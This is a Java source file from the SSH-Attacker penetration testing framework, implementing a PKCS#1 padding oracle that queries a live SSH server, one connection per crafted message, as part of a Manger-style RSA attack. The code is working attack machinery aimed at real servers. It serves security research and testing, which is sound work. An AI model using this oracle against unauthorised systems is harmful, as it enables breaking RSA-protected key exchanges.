/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2022 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.sshattacker.attacks.pkcs1.oracles;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

import de.rub.nds.sshattacker.attacks.pkcs1.MangerWorkflowGenerator;
import de.rub.nds.sshattacker.attacks.response.EqualityError;
import de.rub.nds.sshattacker.attacks.response.FingerPrintChecker;
import de.rub.nds.sshattacker.attacks.response.ResponseExtractor;
import de.rub.nds.sshattacker.attacks.response.ResponseFingerprint;
import de.rub.nds.sshattacker.core.config.Config;
import de.rub.nds.sshattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.sshattacker.core.state.State;
import de.rub.nds.sshattacker.core.workflow.DefaultWorkflowExecutor;
import de.rub.nds.sshattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.sshattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.util.MathHelper;
import java.io.IOException;
import java.security.PublicKey;
import java.security.interfaces.RSAPublicKey;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/** An oracle that communicates with a real server to check PKCS conformity */
public class RealDirectMessagePkcs1Oracle extends Pkcs1Oracle {

    private static final Logger LOGGER = LogManager.getLogger();

    private final Config config;

    private final ResponseFingerprint validResponseContent;

    private final ResponseFingerprint invalidResponseContent;

    private final int maxAttempts;

    /**
     * @param pubKey The public key
     * @param config Config
     * @param validResponseContent ResponseFingerprint of a valid response
     * @param invalidResponseContent ResponseFingerprint of an invalid repsonse
     */
    public RealDirectMessagePkcs1Oracle(
            PublicKey pubKey,
            Config config,
            ResponseFingerprint validResponseContent,
            ResponseFingerprint invalidResponseContent) {
        this.publicKey = (RSAPublicKey) pubKey;
        this.blockSize = MathHelper.intCeilDiv(publicKey.getModulus().bitLength(), Byte.SIZE);
        this.validResponseContent = validResponseContent;
        this.invalidResponseContent = invalidResponseContent;
        this.config = config;
        this.maxAttempts = 10;
    }

    /**
     * @param pubKey The public key
     * @param config Config
     * @param validResponseContent ResponseFingerprint of a valid response
     * @param invalidResponseContent ResponseFingerprint of an invalid response
     * @param maxAttempts Number of times the oracle should repeat the query on a workflow exception
     */
    public RealDirectMessagePkcs1Oracle(
            PublicKey pubKey,
            Config config,
            ResponseFingerprint validResponseContent,
            ResponseFingerprint invalidResponseContent,
            int maxAttempts) {
        this.publicKey = (RSAPublicKey) pubKey;
        this.blockSize = MathHelper.intCeilDiv(publicKey.getModulus().bitLength(), Byte.SIZE);
        this.validResponseContent = validResponseContent;
        this.invalidResponseContent = invalidResponseContent;
        this.config = config;
        this.maxAttempts = maxAttempts;
    }

    @Override
    public boolean checkPKCSConformity(final byte[] msg) {
        return checkPKCSConformity(msg, 0);
    }

    private boolean checkPKCSConformity(final byte[] msg, int currentAttempt) {
        // we are initializing a new connection in every loop step, since most
        // of the known servers close the connection after an invalid handshake
        Config sshConfig = config;
        sshConfig.setWorkflowExecutorShouldClose(false);
        WorkflowTrace trace = MangerWorkflowGenerator.generateWorkflow(sshConfig, msg);
        State state = new State(sshConfig, trace);
        WorkflowExecutor workflowExecutor = new DefaultWorkflowExecutor(state);

        numberOfQueries++;
        if (numberOfQueries % 250 == 0) {
            CONSOLE.info("Number of queries so far: {}", numberOfQueries);
        }

        boolean conform = false;
        try {
            workflowExecutor.executeWorkflow();
            if (!trace.executedAsPlanned()) {
                // Something did not execute as planned, the result may be either way
                throw new WorkflowExecutionException("Workflow did not execute as planned!");
            }
            ResponseFingerprint fingerprint = getFingerprint(state);
            clearConnections(state);

            if (fingerprint != null) {
                if (validResponseContent != null) {
                    conform =
                            FingerPrintChecker.checkEquality(fingerprint, validResponseContent)
                                    == EqualityError.NONE;
                } else if (invalidResponseContent != null) {
                    conform =
                            FingerPrintChecker.checkEquality(fingerprint, invalidResponseContent)
                                    != EqualityError.NONE;
                }
            }

        } catch (WorkflowExecutionException e) {
            // If workflow execution failed, retry. This might be because a packet got lost
            LOGGER.debug("Exception during workflow execution:" + e.getLocalizedMessage(), e);
            if (currentAttempt < maxAttempts) {
                return checkPKCSConformity(msg, currentAttempt + 1);
            }
        }
        return conform;
    }

    private ResponseFingerprint getFingerprint(State state) {
        if (state.getWorkflowTrace().allActionsExecuted()) {
            return ResponseExtractor.getFingerprint(state);
        } else {
            LOGGER.debug(
                    "Could not execute Workflow. Something went wrong... Check the debug output for more information");
        }
        return null;
    }

    private void clearConnections(State state) {
        try {
            if (!state.getSshContext().getTransportHandler().isClosed()) {
                state.getSshContext().getTransportHandler().closeConnection();
            }
        } catch (IOException ex) {
            LOGGER.debug(ex);
        }
    }
}
